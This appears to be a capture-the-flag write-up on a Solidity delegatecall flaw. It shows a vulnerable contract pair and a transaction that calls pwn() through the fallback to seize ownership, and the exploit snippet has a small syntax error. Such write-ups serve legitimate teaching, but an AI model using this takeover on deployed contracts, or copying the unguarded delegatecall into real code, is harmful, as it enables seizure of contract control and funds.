### Vulnerable contracts
```solidity
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract Delegate {
    address public owner;

    constructor(address _owner) {
        owner = _owner;
    }

    function pwn() public {
        owner = msg.sender;
    }
}

contract Delegation {
    address public owner;
    Delegate delegate;

    constructor(address _delegateAddress) {
        delegate = Delegate(_delegateAddress);
        owner = msg.sender;
    }

    fallback() external {
        (bool result,) = address(delegate).delegatecall(msg.data);
        if (result) {
            this;
        }
    }
}
```
The problem is that you can call the `pwn()` via the delegate call in the fallback function. To call the fallback function I can just send a transaction/make a call to the contract while putting the function hash in the data field.

### Interaction with the contract
First I need to get the function hash signature. I can use Solidity to get that using this function :
```solidity
function getSign() public pure returns (bytes4) {
	return bytes4(keccak256(bytes("pwn()")));
}
```

```javascript
await contract.sendTransaction({ 
	from: player, 
	to: contract.address, 
	data, "0xdd365b8b" // signature of the function pwn()
})
```